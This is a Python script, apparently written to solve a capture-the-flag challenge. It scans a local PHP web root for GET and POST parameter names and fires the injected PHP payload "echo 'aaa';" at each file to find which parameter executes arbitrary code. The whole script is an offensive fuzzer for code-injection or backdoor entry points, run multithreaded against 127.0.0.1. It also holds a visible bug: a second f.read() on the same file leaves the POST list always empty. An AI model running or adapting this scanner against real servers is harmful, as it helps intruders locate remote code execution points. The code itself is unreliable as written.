import os
import requests
import re
import threading
import time
print('start：  '+  time.asctime( time.localtime(time.time()) ))
s1=threading.Semaphore(100)
filePath = r"D:\phpstudy\phpstudy_pro\WWW\src"
os.chdir(filePath)
requests.adapters.DEFAULT_RETRIES = 5
files = os.listdir(filePath)
session = requests.Session()
session.keep_alive = False
def get_content(file):
    s1.acquire()
    print('trying   '+file+ '     '+ time.asctime( time.localtime(time.time()) ))
    with open(file,encoding='utf-8') as f:
            gets = list(re.findall('\$_GET\[\'(.*?)\'\]', f.read()))
            posts = list(re.findall('\$_POST\[\'(.*?)\'\]', f.read()))
    data = {}
    params = {}
    for m in gets: #遍历所有含有$_GET()方法的
        params[m] = "echo 'aaa';"
    for n in posts:
        data[n] = "echo 'aaa';"
    url = 'http://127.0.0.1/src/'+file
    req = session.post(url, data=data, params=params)
    req.close()
    req.encoding = 'utf-8'
    content = req.text
    # print(content)
    if "aaa" in content:
        flag = 0
        for a in gets:
            req = session.get(url+'?%s='%a+"echo '111';")
            content = req.text
            req.close()
            if "111" in content:
                flag = 1
                break
        if flag != 1:
            for b in posts:
                req = session.post(url, data={b:"echo '222';"})
                content = req.text
                req.close()
                if "222" in content:
                    break
        if flag == 1:
            param = a
        else:
            param = b
        print('file: '+file+"  and param:%s" %param)
        print('endtime: ' + time.asctime(time.localtime(time.time())))
    s1.release()

for i in files:
    t = threading.Thread(target=get_content, args=(i,))
    t.start()

